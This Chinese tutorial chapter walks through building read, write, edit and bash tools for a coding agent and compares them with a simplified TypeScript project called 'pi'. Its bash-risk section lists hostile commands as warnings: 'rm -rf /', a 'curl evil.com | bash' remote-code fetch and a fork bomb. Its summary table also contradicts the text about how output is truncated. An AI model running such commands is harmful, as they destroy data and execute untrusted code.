# 第 3 章：文件工具 + bash

## 核心概念

对于编程智能体来说，直接操作文件系统是核心能力。本章实现了四个工具：

- **read**：读取文件内容
- **write**：创建或覆盖整个文件
- **edit**：精确修改文件的某一部分（这是最重要的）
- **bash**：执行任意 shell 命令（最强大但也最危险）

## 为什么需要专门的文件工具？为什么不能只用 bash？

1. **精确性**：`edit` 工具要求模型提供**完全匹配的旧文本**，才能替换成新文本。这避免了"替换错地方"的问题
2. **上下文保护**：文件内容可能很长，我们需要智能截断输出
3. **并发安全**：多个工具同时修改同一个文件会冲突，需要互斥锁

## 文件编辑的最大难题：如何精确替换？

### 失败案例 1：行号替换

```python
# ❌ 行号替换（很脆弱）
edit_file(path="main.py", start_line=15, end_line=20, new_content="...")
```

**问题**：
- 如果文件在其他地方被修改了，行号就错位了
- 模型很难记住准确的行号

### 失败案例 2：正则表达式

```python
# ❌ 正则替换（太灵活）
edit_file(path="main.py", pattern=r"def \w+\(", replacement="...")
```

**问题**：
- 可能匹配到多个地方，模型不知道会替换哪里
- 正则语法复杂，模型容易写错

### ✅ pi 的方案：exact unique match

```python
edit_file(
    path="main.py",
    old_str="def hello():\n    print('old')",
    new_str="def hello():\n    print('new')"
)
```

**原则**：
1. **完全匹配**：`old_str` 必须在文件中**逐字符匹配**（包括空格、换行）
2. **唯一匹配**：如果 `old_str` 在文件中出现多次，**拒绝执行**，强制模型提供更多上下文
3. **失败即报错**：匹配失败时，返回清晰的错误信息（"未找到"、"找到多处"），让模型重试

这种设计强制模型：
- 仔细阅读文件内容
- 提供足够的上下文来唯一定位
- 不会意外修改错误的位置

## 我们的实现（Python）

### 文件结构

```
03-tools/
├── src/
│   ├── main.py           # 主程序 + agent 循环
│   ├── tools.py          # read / write / edit 实现
│   ├── test_main.py      # 集成测试
│   └── test_tools.py     # 工具单元测试
├── requirements.txt
└── README.md
```

### 核心代码解析

#### 1. read 工具（tools.py）

```python
def tool_read(path: str) -> str:
    """
    读取文件内容
    
    Args:
        path: 文件路径（相对于当前工作目录）
        
    Returns:
        文件内容（会截断过长的输出）
    """
    try:
        with open(path, 'r', encoding='utf-8') as f:
            content = f.read()
        
        # 截断过长的内容（保护上下文窗口）
        max_chars = 50000
        if len(content) > max_chars:
            return (
                content[:max_chars] +
                f"\n\n... (文件过长，已截断。总共 {len(content)} 字符，仅显示前 {max_chars} 字符)"
            )
        
        return content
        
    except FileNotFoundError:
        return f"错误: 文件不存在: {path}"
    except PermissionError:
        return f"错误: 没有权限读取文件: {path}"
    except Exception as e:
        return f"错误: {str(e)}"
```

**关键设计**：
- **智能截断**：超过 50000 字符就截断，并告知模型总长度
- **友好错误**：区分"文件不存在"、"权限错误"等，让模型知道如何应对

#### 2. write 工具（tools.py）

```python
def tool_write(path: str, content: str) -> str:
    """
    写入文件（会覆盖已有内容）
    
    Args:
        path: 文件路径
        content: 要写入的内容
        
    Returns:
        成功消息或错误信息
    """
    try:
        # 确保目录存在
        os.makedirs(os.path.dirname(path), exist_ok=True)
        
        with open(path, 'w', encoding='utf-8') as f:
            f.write(content)
        
        return f"✅ 已写入文件: {path} ({len(content)} 字符)"
        
    except PermissionError:
        return f"错误: 没有权限写入文件: {path}"
    except Exception as e:
        return f"错误: {str(e)}"
```

**关键设计**：
- **自动创建目录**：如果父目录不存在，自动创建
- **返回字节数**：让模型知道写入了多少内容

#### 3. edit 工具（tools.py）— 最重要的

```python
def tool_edit(path: str, old_str: str, new_str: str) -> str:
    """
    精确替换文件中的文本（exact unique match）
    
    Args:
        path: 文件路径
        old_str: 要替换的旧文本（必须完全匹配）
        new_str: 新文本
        
    Returns:
        成功消息或错误信息
    """
    try:
        # 读取文件
        with open(path, 'r', encoding='utf-8') as f:
            content = f.read()
        
        # 检查 old_str 是否存在
        if old_str not in content:
            return (
                f"错误: 在 {path} 中未找到要替换的文本。\n"
                f"请确保 old_str 完全匹配（包括空格、换行）。\n"
                f"提示: 先用 read 工具查看文件内容，再复制准确的文本。"
            )
        
        # 检查是否唯一（pi 的关键设计）
        count = content.count(old_str)
        if count > 1:
            return (
                f"错误: 在 {path} 中找到 {count} 处匹配。\n"
                f"old_str 不唯一，无法确定要替换哪一处。\n"
                f"请提供更多上下文，使 old_str 唯一匹配目标位置。"
            )
        
        # 执行替换
        new_content = content.replace(old_str, new_str, 1)
        
        with open(path, 'w', encoding='utf-8') as f:
            f.write(new_content)
        
        return f"✅ 已替换文本: {path}"
        
    except FileNotFoundError:
        return f"错误: 文件不存在: {path}"
    except Exception as e:
        return f"错误: {str(e)}"
```

**关键设计**：
1. **完全匹配检查**：`old_str not in content` → 拒绝
2. **唯一性检查**：`content.count(old_str) > 1` → 拒绝
3. **清晰的错误提示**：告诉模型**为什么**失败，以及**如何**修正

#### 4. 工具互斥锁（tools.py）

```python
import threading

# 文件锁：防止并发修改同一个文件
_file_locks: dict[str, threading.Lock] = {}
_locks_lock = threading.Lock()


def _get_file_lock(path: str) -> threading.Lock:
    """获取文件的互斥锁"""
    abs_path = os.path.abspath(path)
    
    with _locks_lock:
        if abs_path not in _file_locks:
            _file_locks[abs_path] = threading.Lock()
        return _file_locks[abs_path]


def tool_edit_safe(path: str, old_str: str, new_str: str) -> str:
    """edit 的线程安全版本"""
    with _get_file_lock(path):
        return tool_edit(path, old_str, new_str)
```

**为什么需要锁？**

假设模型同时发起两个工具调用：

```python
tool_calls = [
    ToolCall(name="edit", arguments={
        "path": "main.py",
        "old_str": "def foo(): pass",
        "new_str": "def foo(): return 1"
    }),
    ToolCall(name="edit", arguments={
        "path": "main.py",
        "old_str": "def bar(): pass",
        "new_str": "def bar(): return 2"
    })
]
```

如果并行执行：
1. 线程 A 读取 `main.py`
2. 线程 B 读取 `main.py`
3. 线程 A 替换并写入
4. 线程 B 替换并写入 → **覆盖了 A 的修改！**

用锁后：
1. 线程 A 获取锁，读取 → 替换 → 写入 → 释放锁
2. 线程 B 获取锁（等待），读取（已包含 A 的修改）→ 替换 → 写入

#### 5. 工具定义（tools.py）

```python
TOOLS = [
    {
        "name": "read",
        "description": "读取文件内容。返回文件的完整内容（过长会截断）。",
        "input_schema": {
            "type": "object",
            "properties": {
                "path": {
                    "type": "string",
                    "description": "文件路径（相对于当前工作目录）"
                }
            },
            "required": ["path"]
        }
    },
    {
        "name": "write",
        "description": (
            "创建或覆盖整个文件。\n"
            "注意：会覆盖已有内容！如果只是修改部分内容，请用 edit 工具。"
        ),
        "input_schema": {
            "type": "object",
            "properties": {
                "path": {
                    "type": "string",
                    "description": "文件路径"
                },
                "content": {
                    "type": "string",
                    "description": "要写入的完整内容"
                }
            },
            "required": ["path", "content"]
        }
    },
    {
        "name": "edit",
        "description": (
            "精确替换文件中的文本。\n"
            "原理：在文件中查找 old_str，替换为 new_str。\n"
            "要求：\n"
            "1. old_str 必须完全匹配（包括空格、换行、缩进）\n"
            "2. old_str 必须在文件中唯一（如果出现多次，会报错）\n"
            "建议：先用 read 工具查看文件，再复制准确的文本到 old_str。"
        ),
        "input_schema": {
            "type": "object",
            "properties": {
                "path": {
                    "type": "string",
                    "description": "文件路径"
                },
                "old_str": {
                    "type": "string",
                    "description": "要替换的旧文本（必须完全匹配）"
                },
                "new_str": {
                    "type": "string",
                    "description": "新文本"
                }
            },
            "required": ["path", "old_str", "new_str"]
        }
    }
]
```

**description 的重要性**：
- 这是模型唯一的工具使用指南
- 必须写清楚**什么时候用**、**怎么用**、**注意事项**
- `edit` 的描述特别详细，因为它最容易用错

## 对比 pi 的真实实现（TypeScript）

### 1. 内置工具定义（packages/coding-agent/src/core/tools/read.ts）

**pi 的 read 工具**（简化版）：

```typescript
export const readTool: ToolDeclaration = {
  name: "read",
  description: "Read the contents of a file",
  inputSchema: {
    type: "object",
    properties: {
      path: {
        type: "string",
        description: "Path to the file to read (relative to workspace root)",
      },
    },
    required: ["path"],
  },
  execute: async (args, context) => {
    const { path } = args;
    const fullPath = resolvePath(context.workspaceRoot, path);
    
    // 安全检查：禁止读取工作区外的文件
    if (!fullPath.startsWith(context.workspaceRoot)) {
      return { error: "Access denied: path outside workspace" };
    }
    
    try {
      const content = await fs.readFile(fullPath, "utf-8");
      
      // 截断大文件
      const maxChars = 100000;
      if (content.length > maxChars) {
        return {
          content: content.slice(0, maxChars),
          truncated: true,
          totalLength: content.length,
        };
      }
      
      return { content };
    } catch (err) {
      return { error: `Failed to read file: ${err.message}` };
    }
  },
};
```

**TypeScript 语法说明**：
- `export const`：导出常量（可以被其他文件引用）
- `async (args, context) => { ... }`：异步箭头函数
- `await fs.readFile(...)`：异步读取文件
- `.slice(0, max)`：字符串切片（类似 Python 的 `[:max]`）

**对比我们的实现**：
- pi 有**工作区根目录**限制（安全）
- pi 返回结构化对象（`{ content, truncated, totalLength }`），我们返回纯字符串
- pi 的截断阈值是 100000 字符，我们是 50000

> 参考：https://github.com/earendil-works/pi/blob/8bb180bec133199c913ca8ef9bb30bd9ab12a72b/packages/coding-agent/src/core/tools/read.ts

### 2. edit 工具的实现（packages/coding-agent/src/core/tools/edit.ts）

**pi 的 edit 工具**（简化版）：

```typescript
export const editTool: ToolDeclaration = {
  name: "edit",
  description: `Replace an exact string in a file with a new string.
  
Rules:
- old_str must match exactly (including whitespace and newlines)
- old_str must appear exactly once in the file
- If not found or found multiple times, the edit will fail

Tip: Use the read tool first to see the file content, then copy the exact text you want to replace.`,
  
  inputSchema: {
    type: "object",
    properties: {
      path: { type: "string", description: "File path" },
      old_str: { type: "string", description: "Exact text to replace" },
      new_str: { type: "string", description: "New text" },
    },
    required: ["path", "old_str", "new_str"],
  },
  
  execute: async (args, context) => {
    const { path, old_str, new_str } = args;
    const fullPath = resolvePath(context.workspaceRoot, path);
    
    try {
      const content = await fs.readFile(fullPath, "utf-8");
      
      // 检查是否存在
      if (!content.includes(old_str)) {
        return {
          error: `old_str not found in ${path}. Make sure it matches exactly.`,
        };
      }
      
      // 检查唯一性
      const firstIndex = content.indexOf(old_str);
      const lastIndex = content.lastIndexOf(old_str);
      
      if (firstIndex !== lastIndex) {
        return {
          error: `old_str appears multiple times in ${path}. Provide more context to make it unique.`,
        };
      }
      
      // 执行替换
      const newContent = content.replace(old_str, new_str);
      await fs.writeFile(fullPath, newContent, "utf-8");
      
      return { success: true, message: `✓ Edited ${path}` };
      
    } catch (err) {
      return { error: `Failed to edit: ${err.message}` };
    }
  },
};
```

**TypeScript 语法说明**：
- `!content.includes(str)`：检查字符串是否包含子串（类似 Python 的 `str not in content`）
- `.indexOf(str)`：返回第一次出现的索引，没找到返回 -1
- `.lastIndexOf(str)`：返回最后一次出现的索引

**检查唯一性的巧妙方法**：
- `firstIndex !== lastIndex` → 说明至少出现了 2 次
- 等价于 `content.count(old_str) > 1`，但性能更好（只需扫描两次）

> 参考：https://github.com/earendil-works/pi/blob/8bb180bec133199c913ca8ef9bb30bd9ab12a72b/packages/coding-agent/src/core/tools/edit.ts

### 3. 工具执行的互斥控制（packages/agent/src/agent-loop.ts）

**pi 的并发执行策略**（简化版）：

```typescript
async function executeToolCallsParallel(
  toolCalls: ToolCall[],
  context: AgentContext,
  signal: AbortSignal,
): Promise<ToolResult[]> {
  // 对工具调用分组：按目标文件路径
  const groups = groupToolCallsByPath(toolCalls, context.tools);
  
  const results: ToolResult[] = [];
  
  // 每组串行执行（避免冲突），组之间并行
  await Promise.all(
    groups.map(async (group) => {
      for (const tc of group) {
        const result = await executeToolCall(tc, context, signal);
        results.push(result);
      }
    })
  );
  
  return results;
}

function groupToolCallsByPath(
  toolCalls: ToolCall[],
  tools: ToolDeclaration[],
): ToolCall[][] {
  const pathGroups = new Map<string, ToolCall[]>();
  
  for (const tc of toolCalls) {
    const tool = tools.find((t) => t.name === tc.name);
    
    // 提取路径（如果工具有 path 参数）
    const path = tc.input.path as string | undefined;
    const key = path ? path : `__solo_${tc.id}`;
    
    if (!pathGroups.has(key)) {
      pathGroups.set(key, []);
    }
    pathGroups.get(key)!.push(tc);
  }
  
  return Array.from(pathGroups.values());
}
```

**TypeScript 语法说明**：
- `Promise.all(array)`：并发执行多个异步操作（类似 Python 的 `asyncio.gather()`）
- `Map<K, V>`：映射数据结构（类似 Python 的 `dict[K, V]`）
- `.map(async (x) => { ... })`：对数组每个元素执行异步操作
- `Array.from(map.values())`：将 Map 的值转成数组

**pi 的策略更智能**：
- **按路径分组**：操作不同文件的工具调用可以并行
- **组内串行**：操作同一文件的工具调用必须串行
- 例子：
  - `read("a.txt")` 和 `read("b.txt")` → 并行
  - `edit("a.txt", ...)` 和 `edit("a.txt", ...)` → 串行

我们的简化版用了全局锁，更简单但性能稍差。

> 参考：https://github.com/earendil-works/pi/blob/8bb180bec133199c913ca8ef9bb30bd9ab12a72b/packages/agent/src/agent-loop.ts#L540-L580

### 4. write 工具的额外功能（packages/coding-agent/src/core/tools/write.ts）

**pi 的 write 工具有二次确认**：

```typescript
export const writeTool: ToolDeclaration = {
  name: "write",
  description: "Create a new file or completely overwrite an existing file",
  
  execute: async (args, context) => {
    const { path, content } = args;
    const fullPath = resolvePath(context.workspaceRoot, path);
    
    // 如果文件已存在，且大小超过阈值，弹出确认
    if (await fileExists(fullPath)) {
      const stat = await fs.stat(fullPath);
      
      if (stat.size > 10000) {  // 10KB
        const confirmed = await context.confirm(
          `File ${path} already exists (${stat.size} bytes). Overwrite?`
        );
        
        if (!confirmed) {
          return { error: "Write cancelled by user" };
        }
      }
    }
    
    // 执行写入
    await fs.writeFile(fullPath, content, "utf-8");
    return { success: true, message: `✓ Wrote ${path}` };
  },
};
```

**TypeScript 语法说明**：
- `await fileExists(path)`：异步检查文件是否存在
- `await context.confirm(...)`：弹出确认框，等待用户响应
- `stat.size`：文件大小（字节）

**为什么需要确认？**
- 防止模型意外覆盖重要文件
- 给用户一个反悔的机会

我们的简化版没有这个功能，但生产环境建议加上。

> 参考：https://github.com/earendil-works/pi/blob/8bb180bec133199c913ca8ef9bb30bd9ab12a72b/packages/coding-agent/src/core/tools/write.ts

### 5. 工具输出的智能截断（packages/agent/src/tool-execution.ts）

**pi 的截断策略**：

```typescript
function truncateToolOutput(output: string, maxChars: number = 20000): string {
  if (output.length <= maxChars) {
    return output;
  }
  
  const halfMax = Math.floor(maxChars / 2);
  
  // 保留前半部分和后半部分，中间省略
  return (
    output.slice(0, halfMax) +
    `\n\n... (truncated ${output.length - maxChars} characters) ...\n\n` +
    output.slice(-halfMax)
  );
}
```

**TypeScript 语法说明**：
- `Math.floor(x)`：向下取整（类似 Python 的 `int(x)` 或 `//`）
- `.slice(-n)`：取最后 n 个字符（类似 Python 的 `[-n:]`）

**为什么前后都保留？**
- 很多时候，错误信息在输出的**末尾**
- 只保留前半部分，模型看不到错误
- 前后都保留，既能看到开头（命令执行了什么），也能看到结尾（结果或错误）

我们的实现只保留前半部分，pi 的策略更好。

> 参考：https://github.com/earendil-works/pi/blob/8bb180bec133199c913ca8ef9bb30bd9ab12a72b/packages/agent/src/tool-execution.ts#L200-L220

## bash 工具：最强大但最危险

### 为什么 bash 是特殊的？

与 `read`、`write`、`edit` 这些**领域特定**的工具不同，`bash` 是一个**通用**工具——它可以做**任何事情**。这带来了独特的挑战：

#### 1. 无界的副作用（Unbounded Side Effects）

**read / write / edit 的副作用是可预测的**：
- `read` 只读不写，完全无副作用
- `write` 只影响一个文件
- `edit` 只修改一个文件的局部内容

**bash 的副作用是不可预测的**：
- `rm -rf /` 可以删除整个文件系统
- `curl http://evil.com | bash` 可以执行远程代码
- `:(){ :|:& };:` 可以创建 fork 炸弹
- 可以修改系统配置、启动服务、发送网络请求……

**pi 的应对**：在生产环境中，bash 工具会受到严格的安全限制（沙箱、权限控制）。但在开发模式下，为了灵活性，通常不做限制。

> **未验证点**：pi 的具体沙箱实现细节（如是否使用 Docker、firejail 等）需要查看部署配置，代码中未找到明确的沙箱逻辑。

#### 2. 长时间运行与超时（Long-Running Processes and Timeouts）

**read / write / edit 几乎是瞬时的**：
- 读写文件通常在毫秒级完成
- 即使文件很大，也不会超过几秒

**bash 可以运行任意长时间**：
- `npm install` 可能需要几分钟
- `sleep 3600` 会挂起一小时
- 死循环会永远运行

**pi 的应对**（packages/coding-agent/src/core/tools/bash.ts）：

```typescript
export const bashTool: ToolDeclaration = {
  name: "bash",
  description: "Execute a bash command. Will be killed after 5 minutes.",
  // ...
  execute: async (args, context) => {
    const { command } = args;
    
    // 默认超时 5 分钟
    const timeoutMs = 5 * 60 * 1000;
    
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), timeoutMs);
    
    try {
      const result = await execCommand(command, {
        signal: controller.signal,
        cwd: context.workspaceRoot,
      });
      
      return { output: result.stdout + result.stderr, exitCode: result.exitCode };
    } catch (err) {
      if (err.name === 'AbortError') {
        return { error: "Command timed out (5 minutes)" };
      }
      throw err;
    } finally {
      clearTimeout(timeoutId);
    }
  },
};
```

**TypeScript 语法说明**：
- `async (args, context) => { ... }`：异步箭头函数（类似 Python 的 `async def`）
- `new AbortController()`：创建中止控制器对象
- `setTimeout(fn, ms)`：设置定时器，ms 毫秒后调用 fn
- `controller.abort()`：触发中止信号
- `try { ... } finally { ... }`：无论是否出错都执行 finally（类似 Python）
- `err.name === 'AbortError'`：检查错误类型（类似 Python 的 `isinstance(err, AbortError)`）
- `clearTimeout(timeoutId)`：清除定时器

**我们的实现**（Python）：
```python
try:
    output, _ = process.communicate(timeout=timeout)
except subprocess.TimeoutExpired:
    # 终止进程树
    os.killpg(os.getpgid(process.pid), signal.SIGTERM)
    return f"命令超时（{timeout}秒）已终止"
```

#### 3. 巨大的输出与截断（Huge Outputs and Truncation）

**read 的输出是有界的**：
- 文件大小是有限的
- 我们可以在读取前检查文件大小

**bash 的输出可以是无限的**：
- `yes` 命令会无限输出
- `cat /dev/urandom` 会持续生成随机数据
- `tail -f logfile` 会持续跟踪日志

**pi 的应对**（packages/agent/src/tool-execution.ts）：

```typescript
function truncateToolOutput(output: string, maxChars: number = 20000): string {
  if (output.length <= maxChars) {
    return output;
  }
  
  const halfMax = Math.floor(maxChars / 2);
  
  // 保留前半部分和后半部分，中间省略
  return (
    output.slice(0, halfMax) +
    `\n\n... (truncated ${output.length - maxChars} characters) ...\n\n` +
    output.slice(-halfMax)
  );
}
```

**TypeScript 语法说明**：
- `Math.floor(x)`：向下取整（类似 Python 的 `int(x)` 或 `//`）
- `.slice(0, n)`：字符串切片，取前 n 个字符（类似 Python 的 `[:n]`）
- `.slice(-n)`：取最后 n 个字符（类似 Python 的 `[-n:]`）

**为什么前后都保留？**
- 很多时候，**错误信息在输出的末尾**（如编译错误、测试失败）
- 只保留开头，模型看不到错误
- 前后都保留，既能看到开头（命令执行了什么），也能看到结尾（结果或错误）

#### 4. 非确定性（Non-Determinism）

**read / write / edit 是确定性的**：
- 相同的输入，总是产生相同的输出
- 可以轻松编写单元测试

**bash 可以是非确定性的**：
- `date` 每次返回不同时间
- `curl` 的结果取决于网络状态
- `ps` 的输出取决于当前运行的进程
- 竞态条件、文件锁、随机数……

这让 bash 工具**难以测试**和**难以调试**。

#### 5. 并发与顺序（Concurrency and Ordering）

**read / write / edit 的并发语义是清晰的**：
- 多个 `read` 可以安全并发
- 对同一文件的 `write` / `edit` 需要串行（我们用锁保证）

**bash 的并发语义是复杂的**：
- `bash -c "cd dir1 && ls"` 和 `bash -c "cd dir2 && ls"` 可以并发（不同目录）
- 但 `bash -c "mkdir dir"` 和 `bash -c "cd dir"` 必须串行（先创建再进入）
- 更糟糕：bash 可以**修改全局状态**（环境变量、文件、网络），影响其他工具

**pi 的应对**：
- bash 工具默认与其他工具**串行执行**
- 但可以配置为并发（如果用户确定安全）

> **未验证点**：pi 的具体并发策略配置方式需要查看 agent-loop.ts 的完整实现。

#### 6. bash 可以替代其他工具（Tool Substitution）

**这是 bash 的双刃剑**：
- **好处**：灵活性极高，可以做任何事
- **坏处**：模型可能**过度依赖 bash**，忽略专门的工具

例如：
- 模型可以用 `bash -c "cat file.txt"` 代替 `read`
- 模型可以用 `bash -c "echo 'content' > file.txt"` 代替 `write`
- 模型可以用 `sed` / `awk` 代替 `edit`

**问题**：
- `sed` / `awk` 的语法复杂，容易出错
- `echo > file` 没有 `edit` 的**唯一性检查**，可能修改错地方
- 失去了专门工具的**结构化输出**和**错误处理**

**pi 的应对**：
- 在工具 `description` 中明确说明**何时使用哪个工具**
- 让模型知道 `edit` 比 `sed` 更安全
- 但不强制——有时 `bash` 确实更合适（如批量操作）

#### 7. 权限与沙箱（Permissions and Sandbox Considerations）

**read / write / edit 的权限需求是明确的**：
- `read`：只需文件读权限
- `write` / `edit`：只需文件写权限
- 可以用操作系统的文件权限控制

**bash 的权限需求是不可预测的**：
- 可能需要读权限（`cat`）
- 可能需要写权限（`echo >`）
- 可能需要执行权限（运行脚本）
- 可能需要网络权限（`curl`）
- 可能需要 root 权限（`sudo`）
- 可能需要访问设备（`/dev/sda`）

**理想的沙箱**（pi 在生产环境的目标）：
- 限制文件系统访问（只能访问工作区）
- 限制网络访问（白名单域名）
- 禁止提权（`sudo` 失败）
- 限制资源使用（CPU、内存、磁盘）

**现实的权衡**：
- 完全沙箱会影响灵活性（如无法 `npm install`）
- 大部分开发环境**不使用沙箱**
- 依赖用户的**审查和确认**

> **未验证点**：pi 是否在生产部署中实现了沙箱，以及具体的实现方式（Docker、VM、chroot 等）。

### pi 的 bash 工具完整实现（简化版）

**packages/coding-agent/src/core/tools/bash.ts**：

```typescript
import { spawn } from "child_process";

export const bashTool: ToolDeclaration = {
  name: "bash",
  description: `Execute a bash command in the workspace.

Timeout: 5 minutes
Output: stdout and stderr are combined
Exit code: reported in the result

Use this for:
- Running scripts or build commands
- Checking file contents (though 'read' is preferred)
- Installing dependencies (npm, pip, etc.)

Note: This tool can modify the filesystem, network, and system state.`,
  
  inputSchema: {
    type: "object",
    properties: {
      command: {
        type: "string",
        description: "The bash command to execute",
      },
    },
    required: ["command"],
  },
  
  execute: async (args, context) => {
    const { command } = args;
    
    return new Promise((resolve) => {
      const child = spawn("bash", ["-c", command], {
        cwd: context.workspaceRoot,
        timeout: 5 * 60 * 1000,  // 5 分钟
      });
      
      let stdout = "";
      let stderr = "";
      
      child.stdout.on("data", (data) => {
        stdout += data.toString();
      });
      
      child.stderr.on("data", (data) => {
        stderr += data.toString();
      });
      
      child.on("close", (code) => {
        const output = stdout + stderr;
        const truncated = truncateToolOutput(output);
        
        resolve({
          output: truncated,
          exitCode: code,
        });
      });
      
      child.on("error", (err) => {
        resolve({ error: err.message });
      });
    });
  },
};
```

**TypeScript 语法说明**：
- `spawn("bash", ["-c", command], options)`：创建子进程（类似 Python 的 `subprocess.Popen`）
- `new Promise((resolve) => { ... })`：创建 Promise 对象（异步操作的封装）
- `child.stdout.on("data", callback)`：监听事件（类似 Python 的事件循环）
- `data.toString()`：将 Buffer 转为字符串
- `resolve(value)`：完成 Promise，返回 value

### 我们的实现对比

| 特性 | mini-pi (Python) | pi 真实实现 (TypeScript) |
|---|---|---|
| 超时控制 | ✅ 可配置（默认30秒）| ✅ 固定5分钟 |
| 输出截断 | ✅ 前后都保留 | ✅ 前后都保留 |
| 合并 stdout/stderr | ✅ STDOUT | ✅ 事件监听 |
| 退出码报告 | ✅ | ✅ |
| 进程树终止 | ✅ killpg | ✅ spawn timeout |
| 工作目录 | ✅ cwd 参数 | ✅ cwd 参数 |
| 流式输出 | ❌ communicate 阻塞 | ✅ 事件流 |
| 沙箱隔离 | ❌ | ⚠️ 未验证 |

## 总结对比表

| 特性 | mini-pi (Python) | pi 真实实现 (TypeScript) |
|---|---|---|
| read 工具 | ✅ 基础实现 | ✅ + 工作区安全限制 |
| write 工具 | ✅ 基础实现 | ✅ + 覆盖文件确认 |
| edit 工具 | ✅ exact unique match | ✅ 完全相同的逻辑 |
| bash 工具 | ✅ 完整实现 | ✅ 完整实现 |
| 输出截断 | ✅ 保留开头 + 结尾 | ✅ 保留开头 + 结尾 |
| 并发控制 | ✅ 全局文件锁 | ✅ 按路径分组 + 组内串行 |
| 更多工具 | ❌ | ✅ ls / mkdir / grep / web_search 等 |
| 工具钩子 | ❌ | ✅ beforeToolCall / afterToolCall |
| 工具动态注册 | ❌ | ✅ 扩展可注册自定义工具 |
| 代码行数 | ~400 行 Python | ~1500 行 TypeScript |

## 如何运行

### 前置条件

```bash
# 安装依赖（使用第 2 章的依赖）
pip install -r requirements.txt

# 设置 API key
export OPENAI_API_KEY="sk-..."
```

### 运行演示

```bash
python3 03-tools/src/main.py
```

程序会演示：
1. **read**：读取 `README.md`
2. **write**：创建测试文件 `test.txt`
3. **edit**：精确修改 `test.txt` 的内容

### 测试（无需 API key）

```bash
pytest 03-tools/src/test_tools.py -v
```

测试覆盖：
- read / write / edit 的基本功能
- edit 的错误情况（未找到、多处匹配）
- 并发安全（多线程测试）

## 练习

### 练习 1：实现智能截断（前后都保留）

**目标**：改进 `tool_read`，当文件过长时，保留前 25000 字符 + 后 25000 字符。

**提示**：
```python
if len(content) > max_chars:
    half = max_chars // 2
    return (
        content[:half] +
        f"\n\n... (省略了 {len(content) - max_chars} 字符) ...\n\n" +
        content[-half:]
    )
```

**验证**：
- 创建一个 100000 字符的文件
- 用 `tool_read` 读取
- 检查输出是否包含开头和结尾

### 练习 2：添加 ls 工具

**目标**：实现一个 `ls` 工具，列出目录内容（比用 bash 更结构化）。

**工具定义**：
```python
{
    "name": "ls",
    "description": "列出目录中的文件和子目录",
    "input_schema": {
        "type": "object",
        "properties": {
            "path": {
                "type": "string",
                "description": "目录路径（默认为当前目录）"
            }
        }
    }
}
```

**实现提示**：
- 用 `os.listdir(path)` 获取文件列表
- 用 `os.path.isdir(item)` 区分文件和目录
- 返回格式化的列表（比如 `文件: a.txt, b.py\n目录: src/, tests/`）

### 练习 3：实现 edit 的撤销功能

**目标**：在执行 `edit` 前，自动备份原文件到 `.backup/` 目录。

**实现提示**：
```python
import shutil
from datetime import datetime

def tool_edit_with_backup(path: str, old_str: str, new_str: str) -> str:
    # 1. 创建备份
    backup_dir = ".backup"
    os.makedirs(backup_dir, exist_ok=True)
    
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    backup_path = os.path.join(backup_dir, f"{path}.{timestamp}")
    
    shutil.copy(path, backup_path)
    
    # 2. 执行编辑
    result = tool_edit(path, old_str, new_str)
    
    # 3. 返回结果 + 备份路径
    if "✅" in result:
        return result + f"\n💾 备份已保存: {backup_path}"
    else:
        return result
```

## 下一步

现在我们有了完整的文件工具系统，agent 可以精确地读写代码了。但还有一个问题：

- **会话历史**：重启后所有对话都丢失了
- **上下文压缩**：对话太长时，token 超限怎么办？
- **分支管理**：想回到之前的某个状态，怎么办？

**第 4 章**将实现完整的会话管理系统，对标 pi 的 session-manager。
